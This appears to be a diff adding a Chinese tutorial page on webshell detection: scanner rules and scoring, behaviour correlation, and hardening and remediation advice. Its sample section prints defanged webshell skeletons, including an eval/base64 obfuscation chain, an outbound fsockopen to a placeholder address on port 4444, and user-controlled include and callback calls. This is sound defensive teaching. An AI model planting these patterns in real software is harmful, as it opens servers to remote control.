+    <span class="k">for</span> <span class="n">rule</span><span class="p">,</span> <span class="n">count</span> <span class="ow">in</span> <span class="n">counts</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+        <span class="n">weight</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">该规则的权重</span><span class="o">&gt;</span>
+        <span class="n">score</span> <span class="o">+=</span> <span class="n">weight</span> <span class="o">+</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1</span>   <span class="c1"># 首次记权重，之后每次 +1，封顶 3 次</span>
+    <span class="k">return</span> <span class="n">score</span>
+</code></pre></div>
+<p>用文字表述：</p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>计分</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>某规则命中 1 次</td>
+<td><code>weight</code></td>
+</tr>
+<tr>
+<td>命中 2 次</td>
+<td><code>weight + 1</code></td>
+</tr>
+<tr>
+<td>命中 3 次</td>
+<td><code>weight + 2</code></td>
+</tr>
+<tr>
+<td>命中 ≥4 次</td>
+<td><code>weight + 2</code>（<strong>封顶</strong>，不再累加）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>为什么重复命中要加分？</strong> 混淆/循环调用的后门往往在同一文件里重复出现同一个 API；<br>
+而正常业务代码一般调用一两次。所以"重复"本身是弱信号。</p>
+<p><strong>为什么要封顶？</strong> 否则一个循环变量名写法的正常文件（比如大量 <code>file_put_contents</code>）<br>
+会仅凭数量冲到 critical，误报代价太高。封顶让"数量"最多贡献 2 分。</p>
+<p><strong>实测复现</strong>（可用 <code>01-static-scanner.py --lab</code> 核对）：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>命中的规则（次数）</th>
+<th>计分过程</th>
+<th>得分</th>
+<th>等级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>clean.php</code></td>
+<td><code>php_superglobal_input</code>×1</td>
+<td>1</td>
+<td>1</td>
+<td>low</td>
+</tr>
+<tr>
+<td><code>docs.txt</code></td>
+<td><code>php_cmd_exec</code>×2</td>
+<td>3 + 1</td>
+<td>4</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>simple-cmd.php</code></td>
+<td><code>php_cmd_exec</code>×1</td>
+<td>3</td>
+<td>3</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>obfuscated.php</code></td>
+<td><code>php_dynamic_eval</code>×1 + <code>encode_decode</code>×1 + <code>encode_encode</code>×1 + <code>php_error_suppress</code>×1</td>
+<td>3+2+1+1</td>
+<td>9</td>
+<td><strong>critical</strong></td>
+</tr>
+<tr>
+<td><code>benign-upload.php</code></td>
+<td><code>file_write</code>×1 + <code>php_superglobal_input</code>×2 + <code>encode_encode</code>×1</td>
+<td>2 + (1+1) + 1</td>
+<td>5</td>
+<td><strong>high</strong></td>
+</tr>
+<tr>
+<td><code>asp.asp</code></td>
+<td><code>asp_wscript_shell</code>×1</td>
+<td>3</td>
+<td>3</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>jsp.jsp</code></td>
+<td><code>jsp_runtime_exec</code>×1</td>
+<td>3</td>
+<td>3</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>aspx.aspx.cs</code></td>
+<td><code>aspx_process_start</code>×1</td>
+<td>3</td>
+<td>3</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>upload-shell.php</code></td>
+<td><code>file_write</code>×1 + <code>php_superglobal_input</code>×2</td>
+<td>2 + 2</td>
+<td>4</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>network-backdoor.php</code></td>
+<td><code>network_socket</code>×1 + <code>file_write</code>×1</td>
+<td>2 + 2</td>
+<td>4</td>
+<td>medium</td>
+</tr>
+<tr>
+<td><code>dynamic-include.php</code></td>
+<td><code>include_dynamic</code>×1 + <code>php_superglobal_input</code>×1</td>
+<td>1 + 1</td>
+<td>2</td>
+<td>low</td>
+</tr>
+<tr>
+<td><code>callback-backdoor.php</code></td>
+<td><code>php_call_user_func</code>×1 + <code>php_superglobal_input</code>×1</td>
+<td>2 + 1</td>
+<td>3</td>
+<td>medium</td>
+</tr>
+</tbody>
+</table>
+<p>注意最后三行：<strong>只有动态包含形态掉到了低分</strong>，因为 <code>include_dynamic</code> 权重只有 1。<br>
+这不是 bug——它的意思是"这个特征单独出现时不够可疑"，需要行为和基线来补充。</p>
+<h3 id="45">4.5 分级阈值</h3>
+<table>
+<thead>
+<tr>
+<th>得分</th>
+<th>等级</th>
+<th>处理建议（教学基线）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>≥8</td>
+<td>critical</td>
+<td>立即人工复核，按事件响应流程走</td>
+</tr>
+<tr>
+<td>≥5</td>
+<td>high</td>
+<td>优先复核（含正常业务误报，如 <code>benign-upload.php</code>）</td>
+</tr>
+<tr>
+<td>≥3</td>
+<td>medium</td>
+<td>结合行为信号与业务基线判断</td>
+</tr>
+<tr>
+<td>≥1</td>
+<td>low</td>
+<td>记录观察，不单独触发处置</td>
+</tr>
+<tr>
+<td>0</td>
+<td>clean</td>
+<td><strong>不代表安全</strong>，只代表内置规则没匹配到</td>
+</tr>
+</tbody>
+</table>
+<p>阈值和权重都是<strong>教学基线</strong>，真实产品要按业务调整：一个电商网站的<br>
+"上传处理器"很多，<code>file_write</code> 的权重就该降；一个纯 API 服务出现 <code>system(</code><br>
+就非常异常，权重可以升。</p>
+<h3 id="46">4.6 命中 ≠ 恶意：三类误报来源</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>例子（本课样本）</th>
+<th>为什么会产生</th>
+<th>降噪思路</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>文档 / 注释提到 API 名</strong></td>
+<td><code>docs.txt</code>：运维手册写"别用 <code>system()</code> / <code>exec()</code>"</td>
+<td>正则只看字符串，不看语境</td>
+<td>跳过注释块；对 <code>.md/.txt</code> 给更低权重</td>
+</tr>
+<tr>
+<td><strong>正常业务的同名 API</strong></td>
+<td><code>benign-upload.php</code>：正当上传处理器</td>
+<td>危险 API 与正常功能共用同一批函数</td>
+<td>数据流分析（路径是否可控）；结合目录基线</td>
+</tr>
+<tr>
+<td><strong>编码/序列化的正常用途</strong></td>
+<td><code>base64_encode</code> 生成 token、<code>bin2hex</code> 生成随机 ID</td>
+<td>编码函数本身无善恶</td>
+<td>只给 1 分；必须与高危规则共现才升级</td>
+</tr>
+</tbody>
+</table>
+<p><strong>结论</strong>：静态扫描器的正确用法是<strong>排序</strong>（把最可疑的文件排到最前面），<br>
+而不是<strong>判定</strong>（说某个文件是后门）。任何"命中即删除"的自动化都是错的——<br>
+误报会直接变成生产事故（见练习 8）。</p>
+<h2 id="5">5. 攻击特征 ↔ 检测特征：完整对照</h2>
+<h3 id="51-20-rules">5.1 全部 20 条规则（<code>--rules</code> 输出）</h3>
+<pre class="plain"><code>asp_wscript_shell        w=3  command      ASP
+aspx_process_start       w=3  command      ASPX
+jsp_process_builder      w=3  command      JSP
+jsp_runtime_exec         w=3  command      JSP
+php_cmd_exec             w=3  command      PHP
+php_dynamic_eval         w=3  dynamic      PHP
+asp_execute              w=2  dynamic      ASP
+encode_decode            w=2  encoding     ASPX, PHP, ASP
+file_write               w=2  filesystem   PHP
+jsp_define_class         w=2  dynamic      JSP
+network_socket           w=2  network      PHP
+php_backtick_exec        w=2  command      PHP
+php_call_user_func       w=2  dynamic      PHP
+encode_encode            w=1  encoding     ASPX, PHP, ASP
+file_mod                 w=1  filesystem   PHP
+include_dynamic          w=1  include      PHP
+php_error_suppress       w=1  obfuscation  PHP
+php_globals_var          w=1  obfuscation  PHP
+php_long_obfuscated_var  w=1  obfuscation  PHP
+php_superglobal_input    w=1  input        PHP
+</code></pre>
+<p>按类别归纳（8 类）：</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>规则数</th>
+<th>含义</th>
+<th>权重范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>command</code></td>
+<td>7</td>
+<td>能执行 OS 命令</td>
+<td>2–3</td>
+</tr>
+<tr>
+<td><code>dynamic</code></td>
+<td>4</td>
+<td>能执行代码/加载类</td>
+<td>2–3</td>
+</tr>
+<tr>
+<td><code>encoding</code></td>
+<td>2</td>
+<td>编解码（混淆链的一环）</td>
+<td>1–2</td>
+</tr>
+<tr>
+<td><code>obfuscation</code></td>
+<td>3</td>
+<td>干扰阅读/检测的装饰手法</td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>filesystem</code></td>
+<td>2</td>
+<td>文件写/改/删</td>
+<td>1–2</td>
+</tr>
+<tr>
+<td><code>network</code></td>
+<td>1</td>
+<td>主动外联</td>
+<td>2</td>
+</tr>
+<tr>
+<td><code>input</code></td>
+<td>1</td>
+<td>外部输入入口</td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>1</td>
+<td>动态包含</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<h3 id="52">5.2 样本逐字（占位载荷）</h3>
+<p><code>01-static-scanner.py</code> 的 <code>SAMPLES</code> 是一个<strong>自包含、可复现</strong>的样本集。<br>
+样本只保留"特征骨架"，载荷全是占位符——<strong>不可直接部署</strong>：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// simple-cmd.php —— 命令执行形态</span>
+<span class="cp">&lt;?php</span>
+<span class="c1">// 占位载荷演示：真实场景中此处命令由外部输入拼接</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>   <span class="c1">// 占位命令，仅用于教学特征演示</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// obfuscated.php —— 多层编码 + 动态求值形态</span>
+<span class="cp">&lt;?php</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">gzinflate</span><span class="p">(</span><span class="nb">str_rot13</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;eJwLSS0uAQAFAAGi&#39;</span><span class="p">))));</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// upload-shell.php —— 文件上传/落盘形态</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$dst</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dst&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;/tmp/placeholder-noop&#39;</span><span class="p">;</span>
+<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$dst</span><span class="p">);</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// network-backdoor.php —— 外联形态（占位地址，不会真的连出去）</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s1">&#39;203.0.113.1&#39;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="s1">&#39;placeholder&#39;</span><span class="p">);</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// dynamic-include.php —— 动态包含形态</span>
+<span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]);</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// callback-backdoor.php —— 回调/可变函数形态</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$fn</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fn&#39;</span><span class="p">];</span>
+<span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="s1">&#39;placeholder&#39;</span><span class="p">);</span>
+</code></pre></div>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">php</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="x">// benign-upload.php —— 对照组：**正常业务**的上传处理器</span>
+<span class="x">// 类型白名单 + 随机重命名，逻辑完全正当，却依然评到 high（5 分）</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$allow</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;avatar&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="nv">$allow</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span> <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;avatar&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span>
+    <span class="s1">&#39;/srv/static/avatars/&#39;</span> <span class="o">.</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;.bin&#39;</span><span class="p">);</span>
+</code></pre></div>
+<p>以及三语言骨架（<code>asp.asp</code> / <code>jsp.jsp</code> / <code>aspx.aspx.cs</code>）与两个对照文件<br>
+（<code>clean.php</code> 正常页面、<code>docs.txt</code> 文档误报）。</p>
+<h3 id="53">5.3 从"特征"到"人工复核问题"的映射</h3>
+<table>
+<thead>
+<tr>
+<th>命中的规则</th>
+<th>复核时必须回答的问题</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*_cmd_exec</code> / <code>Process.Start</code> / <code>WScript.Shell</code></td>
+<td>命令字符串是常量还是拼接了外部输入？这个文件在业务里应该存在吗？</td>
+</tr>
+<tr>
+<td><code>php_dynamic_eval</code> / <code>asp_execute</code> / <code>jsp_define_class</code></td>
+<td>求值的字符串从哪来？是模板引擎/路由框架的正常用法吗？</td>
+</tr>
+<tr>
+<td><code>encode_decode</code> + <code>php_error_suppress</code> 共现</td>
+<td>解码结果的用途是什么？为什么需要抑制错误？</td>
+</tr>
+<tr>
+<td><code>file_write</code> + <code>php_superglobal_input</code> 共现</td>
+<td>写入路径、文件名、后缀是否可控？目标目录是否 Web 可访问？</td>
+</tr>
+<tr>
+<td><code>network_socket</code></td>
+<td>目标地址是业务依赖还是陌生的外部地址？</td>
+</tr>
+<tr>
+<td><code>include_dynamic</code></td>
+<td>被包含的文件名是否可控？是否存在 LFI/RFI 条件？</td>
+</tr>
+</tbody>
+</table>
+<h2 id="6">6. 行为关联：从"文件里有特征"到"这台机器在干什么"</h2>
+<p>静态扫描回答"这个文件像不像"，行为关联回答"<strong>这台机器上正在发生什么</strong>"。</p>
+<p><code>02-behavior-hunter.py</code> 接收合成审计事件（模拟 Web 日志 + 进程事件），<br>
+按 <code>(host, instance)</code> 分组累加信号分：</p>
+<table>
+<thead>
+<tr>
+<th>信号 <code>kind</code></th>
+<th>分值</th>
+<th>必要字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>upload_script_write</code></td>
+<td>3</td>
+<td>host, instance, request</td>
+<td>上传目录里被写入了脚本</td>
+</tr>
+<tr>
+<td><code>child_start</code></td>
+<td>2</td>
+<td>host, instance</td>
+<td>Web 进程启动了子进程</td>
+</tr>
+<tr>
+<td><code>cmd_arg_shell</code></td>
+<td>2</td>
+<td>host, instance</td>
+<td>子进程命令行里带 shell</td>
+</tr>
+<tr>
+<td><code>upload_then_delete</code></td>
+<td>2</td>
+<td>host, instance, request</td>
+<td>上传后立刻删除（清理痕迹）</td>
+</tr>
+<tr>
+<td><code>suspicious_ua</code></td>
+<td>1</td>
+<td>host</td>
+<td>明显异常的 User-Agent</td>
+</tr>
+<tr>
+<td><code>many_failed_auth</code></td>
+<td>1</td>
+<td>host</td>
+<td>大量认证失败</td>
+</tr>
+</tbody>
+</table>
+<p>总分 ≥ <code>REVIEW_THRESHOLD = 4</code> → <code>review_required = True</code>。</p>
+<h3 id="61">6.1 三个必须理解的设计决定</h3>
+<p><strong>① 分组键必须含 <code>host</code>。</strong> 不同主机的同名 Web 进程是完全独立的对象。<br>
+按 <code>(host, instance)</code> 分组，跨主机的信号不会互相"凑分"。</p>
+<p><strong>② <code>instance</code> 必须是"进程启动标识"，不能用 PID。</strong></p>
+<pre class="plain"><code>PID 是会复用的：一个 Web worker 崩掉后，新 worker 可能拿到同一个 PID。
+如果拿 PID 当分组键，&quot;旧 worker 的上传事件&quot;会和&quot;新 worker 的子进程事件&quot;
+被错误地拼成同一个攻击链 —— 凭空造出一条不存在的证据。
+本课用 &quot;启动时间 + 身份&quot; 作为 instance（样本里写作 worker-start-1 / start-2）。
+</code></pre>
+<p><strong>③ 信息不全时不下结论。</strong> <code>--no-window</code> 模拟"时间窗口信息缺失"：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>code/02-behavior-hunter.py<span class="w"> </span>--no-window<span class="w"> </span>--events<span class="w"> </span><span class="s1">&#39;[{&quot;host&quot;:&quot;web01&quot;,&quot;kind&quot;:&quot;child_start&quot;}]&#39;</span>
+<span class="c1"># → 直接返回 reason=&quot;time_window_unknown&quot;，review_required=True（但要人工看）</span>
+</code></pre></div>
+<p>理由很硬：<strong>没有时间窗，就无法判断"上传"和"子进程"是不是同一件事造成的</strong>。<br>
+把两个相隔 3 小时的正常事件拼成攻击链，比漏报更有害——因为它看起来像证据。</p>
+<h3 id="62">6.2 静态 + 行为的正确配合方式</h3>
+<pre class="plain"><code>静态扫描（离线副本，文件级）          行为关联（时间窗，主机级）
+  ├─ 找出可疑文件                       ├─ 找出可疑主机
+  ├─ 产物：文件 → 分数/等级             ├─ 产物：主机 → 信号/分数
+  └─ 局限：不知道文件是否被访问过       └─ 局限：不知道被写入的文件内容是什么
+                    ⬎                        ⬐
+              交叉验证：同一个时间窗内，
+              &quot;上传目录被写入脚本&quot; + &quot;该脚本被访问&quot; + &quot;出现了子进程&quot;
+              = 一条完整的、值得立即人工介入的证据链
+</code></pre>
+<h2 id="7">7. 防护与修复原理</h2>
+<p>检测是"事后"，防护是"事前缩小爆炸半径"。按投入产出排序：</p>
+<h3 id="71">7.1 让后门<strong>写不下来</strong>（最优先）</h3>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>原理</th>
+<th>关键点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>上传目录<strong>禁止执行</strong></td>
+<td>即使上传了 <code>.php</code>，Web 服务器也不解析</td>
+<td>Nginx <code>location ^~ /uploads/ { ... }</code> 关掉 PHP handler；或挂载 <code>noexec</code></td>
+</tr>
+<tr>
+<td>上传文件<strong>重命名</strong></td>
+<td>丢掉原始后缀，用随机 ID + 固定后缀</td>
+<td>本课 <code>benign-upload.php</code> 就是这个做法</td>
+</tr>
+<tr>
+<td><strong>白名单</strong>校验</td>
+<td>只允许已知安全类型</td>
+<td>白名单 &gt; 黑名单：黑名单永远漏 <code>.php5</code> <code>.phtml</code> <code>.pHp</code></td>
+</tr>
+<tr>
+<td>校验<strong>内容</strong>而非 <code>Content-Type</code></td>
+<td><code>Content-Type</code> 由客户端提供，可任意伪造</td>
+<td>检查文件头魔数 + 重新编码图片</td>
+</tr>
+<tr>
+<td><strong>存储与 Web 根分离</strong></td>
+<td>文件放对象存储/独立域名，不落在脚本可执行的目录</td>
+<td>这一步能一次性消掉大部分上传型 WebShell</td>
+</tr>
+</tbody>
+</table>
+<h3 id="72">7.2 让后门<strong>就算写下来也做不了事</strong></h3>
+<table>
+<thead>
+<tr>
+<th>措施</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>disable_functions</code>（PHP）</td>
+<td>禁用 <code>system</code>/<code>exec</code>/<code>shell_exec</code>/<code>passthru</code>/<code>popen</code>/<code>proc_open</code>/<code>pcntl_exec</code></td>
+</tr>
+<tr>
+<td><code>open_basedir</code>（PHP）</td>
+<td>限制脚本能访问的目录，挡住读 <code>/etc/passwd</code> 与横向</td>
+</tr>
+<tr>
+<td>最小权限运行</td>
+<td>Web 进程用专用低权限账号，不用 <code>www-data</code> 去读写全站</td>
+</tr>
+<tr>
+<td>只读挂载代码目录</td>
+<td>攻击者无法在代码目录里落地文件</td>
+</tr>
+<tr>
+<td>出网限制</td>
+<td>挡住反向 shell / C2 回连（对应 <code>network_socket</code> 特征）</td>
+</tr>
+<tr>
+<td>WAF / RASP</td>
+<td>拦截明显的 <code>eval($_POST[</code> 之类请求；RASP 能在运行时拦危险调用</td>
+</tr>
+</tbody>
+</table>
+<h3 id="73">7.3 让后门<strong>藏不住</strong>（对应对手：混淆）</h3>
+<ul>
+<li>文件完整性监控（FIM）：对 Web 目录做哈希基线，任何变化都告警</li>
+<li>只允许通过发布流程改动 Web 目录（不可变基础设施）</li>
+<li>审计 <code>php.ini</code>、Web 服务器访问日志；对"从未出现过的 URL 返回 200"告警</li>
+</ul>
+<h3 id="74">7.4 修复流程（发现疑似后门后）</h3>
+<pre class="plain"><code>1. 证据保全：对目录做哈希快照，复制离线副本，记录时间与来源（本课扫描器只读）
+2. 静态扫描：跑 03-webshell-scanner.py，看 high/critical
+3. 人工复核：确认特征是否在注释/文档/正常依赖里；危险调用是否真的接收外部输入
+   ⚠️ 绝不要&quot;运行一下试试&quot; —— 那可能触发回连或破坏证据
+4. 行为关联：把同一时间窗的上传/进程/访问事件喂给 02-behavior-hunter.py
+5. 处置（由负责人决定）：限制服务、轮换所有可能泄露的凭据、排查入口点
+6. 复测：修复后重跑扫描确认基线；检查日志覆盖是否完整
+</code></pre>
+<blockquote>
+<p><strong>为什么工具不自动处置？</strong> 因为"发现问题的组件不应该有权处置问题"。<br>
+模式匹配必然产生误报（4.6），一旦自动化处置，一次误报就是一次生产事故。<br>
+发现与处置必须是两套权限、两道人工关卡。</p>
+</blockquote>
+<h2 id="8">8. 代码案例逐节说明</h2>
+<h3 id="81-codestatic_scanpy">8.1 <code>code/static_scan.py</code> — 规则引擎（被三个脚本共用）</h3>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>RULES</code></td>
+<td>20 条规则，<code>(name, pattern, weight, category, languages)</code></td>
+</tr>
+<tr>
+<td><code>LANG_NAMES</code> / <code>EXT_LANGS</code></td>
+<td>语言标签 → 展示名；扩展名 → 语言集合（压制跨语言误报）</td>
+</tr>
+<tr>
+<td><code>SEVERITY_LEVELS</code> / <code>classify_score</code></td>
+<td>四级阈值；<code>score → level</code></td>
+</tr>
+<tr>
+<td><code>inspect_text(text, languages)</code></td>
+<td>逐规则 <code>finditer</code>，返回命中（规则名/类别/权重/<strong>行号</strong>）并排序</td>
+</tr>
+<tr>
+<td><code>score_findings(findings)</code></td>
+<td>4.4 的评分模型</td>
+</tr>
+<tr>
+<td><code>summarize(findings)</code></td>
+<td>按规则聚合，给人工复核压缩后的摘要</td>
+</tr>
+<tr>
+<td><code>inspect_file(path)</code></td>
+<td><strong>安全守卫</strong>：见下</td>
+</tr>
+<tr>
+<td><code>scan_tree(root, max_files)</code></td>
+<td>遍历目录，不跟随符号链接，返回 <code>files</code> / <code>truncated</code> / <code>walk_errors</code></td>
+</tr>
+<tr>
+<td><code>print_rules()</code></td>
+<td><code>--rules</code> 输出</td>
+</tr>
+<tr>
+<td><code>self_test()</code> / <code>__main__</code></td>
+<td><code>--self-test</code>：验证规则库结构、分级阈值、评分封顶、语言过滤</td>
+</tr>
+</tbody>
+</table>
+<p><code>inspect_file</code> 里的<strong>只读安全守卫</strong>（每一条都有具体理由）：</p>
+<table>
+<thead>
+<tr>
+<th>守卫</th>
+<th>代码</th>
+<th>防的是什么</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>不跟随符号链接</td>
+<td><code>os.O_NOFOLLOW</code> + <code>path.is_symlink()</code> 预检</td>
+<td>顺着 <code>link → /etc/shadow</code> 走出扫描范围</td>
+</tr>
+<tr>
+<td>只读打开</td>
+<td><code>os.O_RDONLY</code></td>
+<td>绝不写、不改权限</td>
+</tr>
+<tr>
+<td>必须普通文件</td>
+<td><code>stat.S_ISREG(os.fstat(...).st_mode)</code></td>
+<td>设备文件/FIFO 会让 <code>read</code> 卡死</td>
+</tr>
+<tr>
+<td>非阻塞</td>
+<td><code>os.O_NONBLOCK</code></td>
+<td>同上，防止在特殊文件上挂住</td>
+</tr>
+<tr>
+<td>大小上限 1 MiB</td>
+<td><code>read(LIMIT + 1)</code> 再判长度</td>
+<td>不把巨型日志/镜像读进内存</td>
+</tr>
+<tr>
+<td>二进制跳过</td>
+<td><code>b'\0' in data</code></td>
+<td>不解析二进制</td>
+</tr>
+<tr>
+<td>编码检查</td>
+<td><code>decode('utf-8')</code> 失败即跳过</td>
+<td>避免乱码产生无意义的匹配</td>
+</tr>
+<tr>
+<td>异常归类</td>
+<td><code>except OSError → status='error'</code></td>
+<td>单文件失败不中断整次扫描，但必须记录</td>
+</tr>
+</tbody>
+</table>
+<h3 id="82-code01-static-scannerpy">8.2 <code>code/01-static-scanner.py</code> — 样本集 + 评分演示</h3>
+<ul>
+<li><code>SAMPLES</code>：<strong>12 个</strong>文件，覆盖正常业务 / 文档误报 / 命令执行 / 编码混淆 /<br>
+  文件上传 / 外联 / 动态包含 / 回调 / 三语言骨架 / 正常上传对照组</li>
+<li><code>build_lab(root)</code>：把样本写进调用方给的目录（本脚本只写临时的）</li>
+<li><code>self_test()</code>：断言"该认的认出来、该低分的低分、误报确实会被命中"</li>
+<li><code>--lab</code>：在 <code>tempfile.TemporaryDirectory()</code> 里生成样本并输出完整 JSON 报告<br>
+  （退出即清理，不污染工作树）</li>
+</ul>
+<h3 id="83-code02-behavior-hunterpy">8.3 <code>code/02-behavior-hunter.py</code> — 行为关联</h3>
+<ul>
+<li><code>SIGNALS</code>：信号 → <code>(分值, 必要字段集合)</code></li>
+<li><code>analyze(events, window_ok=True)</code>：按 <code>(host, instance)</code> 分组累加；<br>
+  缺必要字段<strong>直接抛 <code>ValueError</code></strong>（而不是静默给 0 分）</li>
+<li><code>--events '&lt;json&gt;'</code>：喂合成事件；<code>--no-window</code>：模拟时间窗缺失</li>
+<li>自测覆盖：跨主机不叠加、跨实例（PID 复用）不叠加、分数不足不触发、<br>
+  缺字段报错、时间窗缺失拒绝下结论</li>
+</ul>
+<h3 id="84-code03-webshell-scannerpy-cli">8.4 <code>code/03-webshell-scanner.py</code> — 完整 CLI</h3>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>target</code></td>
+<td>要扫描的本地目录（必填，除非 <code>--self-test</code> / <code>--rules</code>）</td>
+</tr>
+<tr>
+<td><code>--max-files N</code></td>
+<td>文件遍历上限（默认 1000）</td>
+</tr>
+<tr>
+<td><code>--rules</code></td>
+<td>打印规则库</td>
+</tr>
+<tr>
+<td><code>--self-test</code></td>
+<td>自测</td>
+</tr>
+</tbody>
+</table>
+<p>JSON 输出结构：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>files</code></td>
+<td>每个文件：<code>status</code>（scanned/skipped/error）、<code>findings</code>、<code>score</code>、<code>severity</code>、<code>summary</code></td>
+</tr>
+<tr>
+<td><code>summary.files_total</code> / <code>files_scanned</code></td>
+<td>覆盖规模</td>
+</tr>
+<tr>
+<td><code>summary.high_or_critical</code></td>
+<td>高危文件数</td>
+</tr>
+<tr>
+<td><code>summary.top_findings</code></td>
+<td>按等级排序的前 20 个高危/严重文件</td>
+</tr>
+<tr>
+<td><code>truncated</code> / <code>walk_errors</code></td>
+<td><strong>覆盖不全必须如实报告</strong></td>
+</tr>
+<tr>
+<td><code>notice</code></td>
+<td>使用边界提醒</td>
+</tr>
+</tbody>
+</table>
+<p><strong>退出码</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>码</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>所有列出的文件成功扫描（<strong>即使命中了高危</strong>）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>参数错误，或覆盖不全（有跳过/错误/被截断）</td>
+</tr>
+</tbody>
+</table>
